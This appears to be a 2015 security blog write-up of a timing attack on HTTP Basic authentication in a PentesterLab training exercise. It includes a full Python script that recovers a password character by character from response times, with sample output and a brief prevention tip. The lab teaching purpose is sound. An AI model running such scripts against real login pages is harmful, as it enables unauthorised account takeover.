---
layout: post
title: Authentication Timing Attack
date: 2015-08-21
author: Simon
summary: Guess the password in basic web authentication.
categories: security
tags: 
 - Web penetration
 - Authentication Timing Attack
---

## Background 
Non-constant string comparison time can be a vulnerablity of Basic web authentication. If a web developer did not set up constant response time, attackers may get the password by comparing response time of requests. In this article, we will use [Web for Pentester II](https://pentesterlab.com/exercises/web_for_pentester_II) authentication exercise 2 as an example. 

## Basics
![auth page](/img/2015-08-21-authentication-timing-attack.png){:width="500px"}
The process of authenticating is as the following:  
1. The browser sends a HTTP authentication request.     
2. The server compares the strings, and sends response.  

There are other types of auth requests than Basic, such as Digest and custom authentication. The username and password are concealed in the HTTP header. This is the header of Basic Authentication, which is the type of authentication in this example.
{% highlight http %}
GET /authentication/example2 HTTP/1.1
Host: http://192.168.56.101
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
{% endhighlight %}
`dXNlcm5hbWU6cGFzc3dvcmQ=` is the base64 code of `username:password`. The response will give you the status, which is whether you are authenticated or not, and some other content. Status code 200 is success, and 401 is fail. 


## How to
Suppose the actual password is `abcde`. Comparing `abcde` with `ab123` and `abc123`, the second one takes more time than the first one. With `ab123`, it compares 3 characters, and stops at the third letter. With `abc123`, it compares 4 letters, and stops at the fourth character. Based on this time difference, you could get the correct characters by comparing the response time of auth requests. 


## Details
Write a script to send authentication requests, and jot down the response time automatically. For example, this is a part of my ouput.
{% highlight shell%}
$ python ex2.py
 0 0 1.408078
 1 1 1.408148
 2 2 1.408747
...
23 n 1.408357
24 o 1.408269
25 p 1.609422
26 q 1.407573
27 r 1.406407
...
--------------------
Suggest:  25
Select one: 25
...
 1 p1 1.607937
 2 p2 1.608372
 3 p3 1.607752
 4 p4 1.810275
 5 p5 1.608626
 6 p6 1.609457
...
--------------------
Suggest:  4
Select one: 4
...
 0 p40 1.809672
 1 p41 1.810446
 2 p42 1.808867
...
{% endhighlight %}
The output `0 p40 1.809672` means `Index password response_time`. In the first loop, I send requests with one character as password. "p" took longer to respond, which indicated that p is likely to be contained in the password. With the correct bit confirmed, we can then test the next byte. It stops when it finds the correct password (getting response 200). 

### Script 
In this example, Python 2.7 was used to send requests and count time. `Requests: HTTP for Humans` is an easy-to-use library for HTTP requests. time.time() is used to measure the response time. Note that time.clock() and time.time() is different. clock() counts the processing time with respect to the CPU clock, while time() counts the wall clock time, considering other factors such as network latency.

{% highlight python %}
import requests
from requests.auth import HTTPBasicAuth
import time

dict = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
        'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
psw = ''
requests.get('http://192.168.56.101/authentication/example2', auth=HTTPBasicAuth('hacker', 'hacker'))
psw_found = False
while True:
    greatest = 0
    index = 0
    for i in range(len(dict)):
        current_psw = psw + dict[i]
        start = time.time()
        r = requests.get('http://192.168.56.101/authentication/example2', auth=('hacker', current_psw))
        taken = time.time() - start
        if greatest < taken:
            greatest = taken
            index = i
        print '{0:2d} {1:1s} {2:4f}'.format(i, psw + dict[i], taken)
        if r.status_code == 200:
            psw += dict[i]
            print 'password found: ', str(psw)
            psw_found = True
            break
    if psw_found:
        break
    print '--------------------'
    suggest = index
    print 'Suggest: ', suggest
    select = input('Select one: ')
    psw += dict[select]

{% endhighlight %}

### Prevention 
To prevent this vulnerability, either have a constant response time or use a more secure authentication technique.
